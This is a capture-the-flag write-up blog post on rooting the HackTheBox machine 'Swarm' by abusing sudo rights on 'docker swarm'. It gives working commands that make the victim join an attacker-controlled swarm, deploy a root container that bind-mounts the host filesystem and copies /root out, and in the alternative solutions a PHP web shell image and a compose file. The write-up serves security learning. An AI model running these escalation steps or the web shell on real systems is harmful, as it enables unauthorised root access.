---
layout: post
title: "HTB Business CTF: Swarm (but just root)"
image: ""
date: 2024-05-29 00:00:00
tags:
  - linux
  - hackthebox
  - ctf
  - docker
  - gtfobins
description: mfw there's more ways to abuse containers to do whatever i want
categories: 
published: true
comments: false
---

<img src="https://www.hackthebox.com/images/landingv3/og/og-htb-business-2024.jpg" style="width:60%;height:60%">

## Intro
Business CTF featured a fullpwn category, which was 5 boxes of varying difficulty where you need to get initial access and escalate privileges to root. However, one of the easy ones, Swarm, had a premise for privilege escalation that you rarely get to see with CTF machines. [GTFOBins](https://gtfobins.github.io/) is well known for documenting ways to escalate privileges with sudo or SUID permissions, but what if you had sudo on something that wasn't documented? What would you do?

Though it's much harder to communicate trial and error in text, the purpose of this blog is to highlight the research and struggle to figure out how to escalate privileges only using `docker swarm`, which, at the time of writing, wasn't explained at all (but 100% possible if you just read how Docker swarm worked).

* buh
{:toc}

## Context
The nmap scan looks like this:

```shell
# Nmap 7.94SVN scan initiated Sun May 19 01:25:55 2024 as: nmap -Pn -p 22,80,5000 -vv -sC -sV -oA scans/tcp-allscripts 10.129.239.185
Nmap scan report for swarm.htb (10.129.239.185)
Host is up, received user-set (0.056s latency).
Scanned at 2024-05-19 01:25:55 EDT for 41s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp   open  http    syn-ack ttl 62 nginx 1.25.5
|_http-server-header: nginx/1.25.5
|_http-favicon: Unknown favicon MD5: 77C62F50E0A69C4AC72AE72239269561
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home - Simple News Portal
5000/tcp open  http    syn-ack ttl 62 Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 19 01:26:36 2024 -- 1 IP address (1 host up) scanned in 41.12 seconds
```

The box has a Docker registry hosted on port 5000/tcp (i.e. like a locally hosted Git server but for Docker) with one image on it. Since it's unauthenticated, we can pull down the image and inspect it to find a database in there containing hashes that we can crack. One set of credentials gives us local access as `plessing`.

Difficulty is relative, but the foothold wasn't too difficult. In fact, finding where the privilege escalation isn't too hard either.

```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ ssh plessing@swarm.htb
plessing@swarm.htb password:
Linux swarm 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
plessing@swarm:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for plessing:
Matching Defaults entries for plessing on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User plessing may run the following commands on localhost:
    (root : root) /usr/bin/docker swarm *
```

We can run `docker swarm` with root permissions! This must be easy to do! Just copy and paste something from [GTFOBins](https://gtfobins.github.io/), call it a day, right?

![asdf](https://an00brektn.github.io/img/htb-biz-24/Pasted%20image%2020240523172944.png)

Oh. Well surely someone has just written about this right?

![asdf](https://an00brektn.github.io/img/htb-biz-24/Pasted%20image%2020240523173106.png)

Well then.

All of these links are the standard Docker breakouts/privescs, but nothing about Docker **Swarm**. Looks like we have to figure this out ourselves.

## What even is Docker Swarm anyway?
I wrote a pretty long post giving an [intro to Docker](https://notateamserver.xyz/docker-101/) back in 2022, but I never touched on Docker Swarm, mainly because I never had a use for it. However, since we need to figure out how to abuse this, there's no better place to learn than the original docs (most of the time, at least). Per [Docker documentation](https://docs.docker.com/engine/swarm/key-concepts/):

> A swarm consists of multiple Docker hosts which run in Swarm mode and act as managers, to manage membership and delegation, and workers, which run [swarm services](https://docs.docker.com/engine/swarm/key-concepts/#services-and-tasks). A given Docker host can be a manager, a worker, or perform both roles.

If [Docker Compose](https://docs.docker.com/compose/) is a way to orchestrate multiple containers on the same engine, then Swarm is a similar thing, except we're now orchestrating Docker *Engines* on different hosts. The purpose makes sense- if you have containers deployed on a single host, there's a certain point where that needs to be distributed in some way. From an attacker's perspective, then, having sudo privileges to this is extremely lucrative. Just because a privilege escalation isn't documented means it's not possible, we just have to dig for it, especially knowing the number of ways a normal Docker engine can let you escalate privileges.

### Understanding Command Line Features
We can use the command line to get a sense of how Docker Swarm works. On the compromised box:
```shell
plessing@swarm:~$ sudo docker swarm --help

Usage:  docker swarm COMMAND

Manage Swarm

Commands:
  init        Initialize a swarm
  join        Join a swarm as a node and/or manager

Run 'docker swarm COMMAND --help' for more information on a command.
```

Without being connected to a swarm, we can either start a new swarm, or join one (either as a manager or a node). Let's see what options we have if we started a swarm:

```shell
plessing@swarm:~$ docker swarm init --help

Usage:  docker swarm init [OPTIONS]

Initialize a swarm

Options:
      --advertise-addr string                  Advertised address (format: "<ip|interface>[:port]")
      --autolock                               Enable manager autolocking (requiring an unlock key to start a stopped manager)
      --availability string                    Availability of the node ("active", "pause", "drain") (default "active")
      --cert-expiry duration                   Validity period for node certificates (ns|us|ms|s|m|h) (default 2160h0m0s)
      --data-path-addr string                  Address or interface to use for data path traffic (format: "<ip|interface>")
      --data-path-port uint32                  Port number to use for data path traffic (1024 - 49151). If no value is set or is set to 0, the default port (4789) is used.
      --default-addr-pool ipNetSlice           default address pool in CIDR format (default [])
      --default-addr-pool-mask-length uint32   default address pool subnet mask length (default 24)
      --dispatcher-heartbeat duration          Dispatcher heartbeat period (ns|us|ms|s|m|h) (default 5s)
      --external-ca external-ca                Specifications of one or more certificate signing endpoints
      --force-new-cluster                      Force create a new cluster from current state
      --listen-addr node-addr                  Listen address (format: "<ip|interface>[:port]") (default 0.0.0.0:2377)
      --max-snapshots uint                     Number of additional Raft snapshots to retain
      --snapshot-interval uint                 Number of log entries between Raft snapshots (default 10000)
      --task-history-limit int                 Task history retention limit (default 5)
```

There's a lot of options here, which might be hard to process, but we can narrow down what may or may not be worth looking at based on our goals to escalate access.
1. Arbitrary File Read - With arbitrary file read, we would be able to read `/root/root.txt`, but more practically, we could read `/etc/shadow` or any SSH keys that the root user might have.
2. Arbitrary File Write - With arbitrary file write, we could insert a new root user in `/etc/passwd` or `/etc/shadow`, or override some other file that's being executed as root.
3. Command Execution - Self-explanatory, if the goal is to run commands as root, command execution would give us execution as root.

There are likely other ways you can come up with, but with these three umbrella goals can help us realize that at the very least, the logic of any of these flags will not help us. All of these alter something about the swarm configuration that don't advance us closer to our goal. We can check to see if `--external-ca` reads from a file, as programs will often error out by printing the contents of the file, but it unfortunately does not.

```shell
plessing@swarm:~$ sudo docker swarm init --external-ca /root/root.txt
invalid argument "/root/root.txt" for "--external-ca" flag: invalid field '/root/root.txt' must be a key=value pair
See 'docker swarm init --help'.
```

The `docker swarm init` command also doesn't give us too much to look at.

## The Swarm Rises
Docker Swarm works by having a nodes join a manager, and the manager decides what the nodes do, so let's try setting that up. Knowing that the manager controls nodes, and the nodes are ultimately running Docker containers, I want to try having my box be the manager and the victim box be the node. On my machine, I'll initialize the swarm, specifying the address to listen on because I'm on the VPN.

```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker swarm init --advertise-addr 10.10.14.17
Swarm initialized: current node (uooci8o6j0fqe02yragj9vekr) is now a manager.

To add a worker to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-3osordeyfn66v880t1rplwp6n80nbk0vydxo8xv9p0pca2wnbq-bl0la7uc447fpeurm3hzu9ww0 10.10.14.17:2377

To add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions.
```

By copying and pasting the command into the victim machine, it connects back to my swarm, which it's only able to do since we have sudo access. 

```shell
plessing@swarm:~$ docker swarm join --token SWMTKN-1-3osordeyfn66v880t1rplwp6n80nbk0vydxo8xv9p0pca2wnbq-bl0la7uc447fpeurm3hzu9ww0 10.10.14.17:2377
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.45/swarm/join": dial unix /var/run/docker.sock: connect: permission denied
plessing@swarm:~$ sudo docker swarm join --token SWMTKN-1-3osordeyfn66v880t1rplwp6n80nbk0vydxo8xv9p0pca2wnbq-bl0la7uc447fpeurm3hzu9ww0 10.10.14.17:2377
This node joined a swarm as a worker.
```
```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker node ls
ID                            HOSTNAME     STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION
au22q20enepnid6m7zjp3a3hv     swarm        Ready     Active                          26.1.1
madx7zeqzc6ke0a2ehgjv5do7 *   transistor   Ready     Active         Leader           25.0.0
```

### Attempting to Execute Code - Fail
Now the question is how to do anything to our new node. The documentation's quickstart guide gives the following example for deploying a new service:

```shell
docker service create --replicas 1 --name helloworld alpine ping docker.com
```

Cool! So all we have to do is copy and paste this into our box, changing `docker.com` to `10.10.14.17` because HTB machines don't have internet access. Running `docker service ls` confirms that this is up.

```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service create --replicas 1 --name helloworld alpine ping 10.10.14.17
x04ql8gs78pxiohjwtgz2eljy
overall progress: 1 out of 1 tasks
1/1: running   [==================================================>]
verify: Service converged
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service ls
ID             NAME         MODE         REPLICAS   IMAGE           PORTS
x04ql8gs78px   helloworld   replicated   1/1        alpine:latest
```

The docs tell us we can also inspect services with the ID, and also see what nodes are running the service.

```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service inspect --pretty x04ql8gs78px

ID:             x04ql8gs78pxiohjwtgz2eljy
Name:           helloworld
Service Mode:   Replicated
 Replicas:      1
Placement:
UpdateConfig:
 Parallelism:   1
 On failure:    pause
 Monitoring Period: 5s
 Max failure ratio: 0
 Update order:      stop-first
RollbackConfig:
 Parallelism:   1
 On failure:    pause
 Monitoring Period: 5s
 Max failure ratio: 0
 Rollback order:    stop-first
ContainerSpec:
 Image:         alpine:latest@sha256:77726ef6b57ddf65bb551896826ec38bc3e53f75cdde31354fbffb4f25238ebd
 Args:          ping 10.10.14.17
 Init:          false
Resources:
Endpoint Mode:  vip

kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service ps helloworld
ID             NAME           IMAGE           NODE         DESIRED STATE   CURRENT STATE           ERROR     PORTS
p9tmj8l167qx   helloworld.1   alpine:latest   transistor   Running         Running 4 minutes ago
```

Everything looks good until we run the `service ps` command. Although our host is the manager and we want the node to be the one running the container, the node actually has no way to pull that image, because, as we mentioned earlier, it isn't internet connected. As a result, my best guess is that Docker defaults to whatever host is most convenient to deploy the service on. 

It's at this point that I tried to experiment with setting both machines to "manager" to see if some execution was possible, and from my light testing, I couldn't make anything happen. I would include this tangent here, but to be quite honest, it wouldn't add much since I just lost sight of what the goal was. Setting both machines to manager might add some more things to configure for swarm, but I should have realized that swarm is another way to control Docker. That's it. Normally, access to `docker` lets you escalate privileges, so let's focus up and just go after this.

## Putting the Pieces Together
So we've identified a few problems we need to solve:
1. We need the node to be able to access a Docker image to run (and force it onto the `swarm` hostname and not ours)
2. We need to figure out a way to execute code in the container
3. (maybe 2a) We need to set up the container so we can escalate privileges

Answering question 1 isn't too bad, some Googling returns this [blog](https://codeblog.dotsandbrackets.com/private-registry-swarm/) which has the following example:
```shell
docker service create --name=node-server myregistry.com:5000/server
docker service scale node-server=3
```

We can reuse the registry that's already on the box to import the `newsbox-web` image. 

> **Note**: I later learned that the unauthenticated access to the registry included push access, so we literally could have just used our own custom image. We could have thrown OWASP Juice Shop on there if we really wanted to.

Additionally, this [Stack Overflow](https://stackoverflow.com/questions/36609890/can-we-deploy-a-container-into-a-specific-node-in-a-docker-swarm) post mentions the `--constraint` flag, which allows us to restrict service creation to servers with specific attributes.

So, the service we want to create looks like this so far:
```shell
docker service create --name myservice --constraint "node.hostname == swarm" swarm.htb:5000/newsbox-web
```

We can run this to confirm that it runs on the target box.
```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service create --name myservice --constraint "node.hostname == swarm" swarm.htb:5000/newsbox-web
image swarm.htb:5000/newsbox-web:latest could not be accessed on a registry to record
its digest. Each node will access swarm.htb:5000/newsbox-web:latest independently,
possibly leading to different nodes running different
versions of the image.

wryp3h6861jox4y8k8evowbip
overall progress: 1 out of 1 tasks
1/1: running   [==================================================>]
verify: Service converged
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service ls
ID             NAME        MODE         REPLICAS   IMAGE                               PORTS
wryp3h6861jo   myservice   replicated   1/1        swarm.htb:5000/newsbox-web:latest
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service ps myservice
ID             NAME          IMAGE                               NODE      DESIRED STATE   CURRENT STATE            ERROR     PORTS
fe1zesbjx2ua   myservice.1   swarm.htb:5000/newsbox-web:latest   swarm     Running         Running 25 seconds ago
```

Okay, now things are starting to make sense. We now have to deal with the question of code execution and privilege escalation. If we return to documentation once more, this time looking at the information from the `--help` flag, a few flags stand out:

- `--entrypoint` - This will override the entrypoint of the Docker container (i.e. the very first process that runs in the container), which will let us insert commands
- `-u` - This sets the user that's running in the container, which we can set to root, because obviously 
- `-t` - This will allocate a pseudo-TTY, which will be useful if we want to get shell access to the container
- `--mount` - This will be the key to our privilege escalation. If we can mount the root of the filesystem (`/`) in the container, and we're already root inside the container, we have full control over the file system, which we can use to read any SSH keys the root user has, or just the root flag.

Before coming to the mount idea, I was trying to figure out how to execute commands within a Docker container/service from a manager node, but it just seems like it's not a feature that's enabled (which, again, takes trial and error). Coming back to the main point, we can view documentation for using mounts with services [here](https://docs.docker.com/engine/swarm/services/#give-a-service-access-to-volumes-or-bind-mounts).

> Bind mounts are file system paths from the host where the scheduler deploys the container for the task. Docker mounts the path into the container. The file system path must exist before the swarm initializes the container for the task.

The following example is given for a read-write bind:
```shell
docker service create \
  --mount type=bind,src=<HOST-PATH>,dst=<CONTAINER-PATH> \
  --name myservice \
  <IMAGE>
```

There's some warnings about using bind mounts, but since we're only working with the one system, we shouldn't have any problems. All the details in place now, our command becomes this:

```shell
docker service create --mount type=bind,src=/,dst=/host --name privesc -u root --constraint "node.hostname == swarm" --entrypoint "/bin/sh -c 'cp -r /host/root /host/freedom && chmod -R 777 /host/freedom && python manage.py runserver 0.0.0.0:8000'" -t swarm.htb:5000/newsbox-web
```

Breaking down all of the new additions:
- The `--mount type=bind...` mounts `/` from the host into a new directory called `/host` in the container. Any changes to the files in that mount will be reflected on the host and vice versa.
- `-u root` ensures we're running with enough privileges in the container to read/modify files we want
- `--entrypoint` gets a little funky. From my testing, we can't just call some bash commands and call it a day, because then the container will just exit (at least, that's what happened to me). After inspecting `newsbox-web`'s Dockerfile, the entrypoint to that container is `python manage.py runserver 0.0.0.0:8000`. To keep that intact, we essentially inject commands before that Python is called to copy the mounted `/root` directory to a new directory that is world-modifiable called `/freedom`.

Running it from my attacking host, it loads successfully after waiting 5 seconds to confirm stability.
```shell
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service create --mount type=bind,src=/,dst=/host --name privesc -u root --constraint "node.hostname == swarm" --entrypoint "/bin/sh -c 'cp -r /host/root /host/freedom && chmod -R 777 /host/freedom && python manage.py runserver 0.0.0.0:8000'" -t swarm.htb:5000/newsbox-web
image swarm.htb:5000/newsbox-web:latest could not be accessed on a registry to record
its digest. Each node will access swarm.htb:5000/newsbox-web:latest independently,
possibly leading to different nodes running different
versions of the image.

tdkgfaw5lev4ro5c9fr7ml3fw
overall progress: 1 out of 1 tasks
1/1: running   [==================================================>]
verify: Service converged
kali@transistor:~/ctf/htb-biz-24/fullpwn_swarm$ docker service ps privesc
ID             NAME        IMAGE                               NODE      DESIRED STATE   CURRENT STATE            ERROR     PORTS
mjqnmip5tj8l   privesc.1   swarm.htb:5000/newsbox-web:latest   swarm     Running         Running 41 seconds ago
```

And if I check the worker node, we see a new "freedom" directory:
```shell
plessing@swarm:~$ ls -la /
total 72
drwxr-xr-x  19 root root  4096 May 23 22:35 .
drwxr-xr-x  19 root root  4096 May 23 22:35 ..
lrwxrwxrwx   1 root root     7 Nov  7  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Apr 30 13:47 boot
drwxr-xr-x  16 root root  3040 May 23 19:07 dev
drwxr-xr-x  75 root root  4096 May 23 22:34 etc
drwxrwxrwx   4 root root  4096 May 23 22:35 freedom
drwxr-xr-x   3 root root  4096 Apr 30 13:55 home
lrwxrwxrwx   1 root root    31 Apr 17 04:46 initrd.img -> boot/initrd.img-5.10.0-28-amd64
lrwxrwxrwx   1 root root    31 Apr 30 13:47 initrd.img.old -> boot/initrd.img-5.10.0-28-amd64
lrwxrwxrwx   1 root root     7 Nov  7  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Nov  7  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Nov  7  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Nov  7  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Nov  7  2023 lost+found
drwxr-xr-x   3 root root  4096 Apr 30 13:55 media
drwxr-xr-x   2 root root  4096 Apr 30 13:55 mnt
drwxr-xr-x   3 root root  4096 Apr 30 13:55 opt
dr-xr-xr-x 203 root root     0 May 23 19:07 proc
drwx------   4 root root  4096 Apr 30 14:04 root
drwxr-xr-x  21 root root   640 May 23 22:03 run
lrwxrwxrwx   1 root root     8 Nov  7  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Apr 30 13:55 srv
dr-xr-xr-x  13 root root     0 May 23 19:07 sys
drwxrwxrwt  10 root root  4096 May 23 22:35 tmp
drwxr-xr-x  14 root root  4096 Apr 30 13:55 usr
drwxr-xr-x  12 root root  4096 Apr 30 13:55 var
lrwxrwxrwx   1 root root    28 Apr 17 04:46 vmlinuz -> boot/vmlinuz-5.10.0-28-amd64
lrwxrwxrwx   1 root root    28 Apr 30 13:47 vmlinuz.old -> boot/vmlinuz-5.10.0-28-amd64
```

And there we have the flag:
```shell
plessing@swarm:~$ cd /freedom
plessing@swarm:/freedom$ ls -la
total 28
drwxrwxrwx  4 root root 4096 May 23 22:35 .
drwxr-xr-x 19 root root 4096 May 23 22:35 ..
lrwxrwxrwx  1 root root    9 May 23 22:35 .bash_history -> /dev/null
-rwxrwxrwx  1 root root  571 May 23 22:35 .bashrc
drwxrwxrwx  3 root root 4096 May 23 22:35 .docker
drwxrwxrwx  4 root root 4096 May 23 22:35 docker
-rwxrwxrwx  1 root root  161 May 23 22:35 .profile
-rwxrwxrwx  1 root root   24 May 23 22:35 root.txt
plessing@swarm:/freedom$ cat root.txt
HTB{5tunG_bY_th3_5w4rm}
```

**flag**: `HTB{5tunG_bY_th3_5w4rm}`

Overall, this box's "Easy" rating was, in my opinion, was perfect. The box's premise was simple, the research was not obscure, but you could not proceed without taking the time to pause and think about what's actually happening. This writeup was very geared towards beginners, and I hope it sheds some more light on the process of coming up with these attacks, because people are rarely popping shells on the first try all of the time.

## "Alternative" Solutions
Docker is an ecosystem for a lot of shenanigans, so naturally there's multiple ways to achieve similar goals.
### Box Author's Solution
C4rm3l0, the box author, put out their solution [here](https://crzphil.github.io/posts/swarm/), which was ultimately very similar to mine, except they created and pushed a new image to the registry. They also started the swarm on the `swarm` box instead of their attacking machine, which worked out similarly.

```shell
mkdir pwnpod
cd pwnpod

cat > Dockerfile <<EOF
FROM php:latest
WORKDIR /var/www/html
COPY index.php .
CMD ["php", "-S", "0.0.0.0:1337"]
EOF

cat > index.php <<EOF           
<?php system(\$_GET[0])?>
EOF
```
```shell
docker image build . -t pwnpod:latest
docker image tag pwnpod:latest 10.129.230.94:5000/pwnpod:latest
docker push 10.129.230.94:5000/pwnpod:latest
```

### Using A VPS
lordrukie on Discord mentioned having issues with using swarm on their Mac machine.

![asdf](https://an00brektn.github.io/img/htb-biz-24/Pasted%20image%2020240523215250.png)

Their solution was to spin up a VPS, and created a Docker compose file to deploy the stack automatically.

```yaml
version: '3.8'

services:
  lmao5:
    image: swarm.htb:5000/newsbox-web:latest
    deploy:
      replicas: 1
    ports:
      - "8227:8000"
    volumes:
      - /root:/tmp/root
      - /tmp:/tmp/new
    command: "cp -r /tmp/root /tmp/new/mantab && chmod -R 777 /tmp/new/mantab"
```
```shell
docker stack deploy -c docker-compose.yml mystack3
```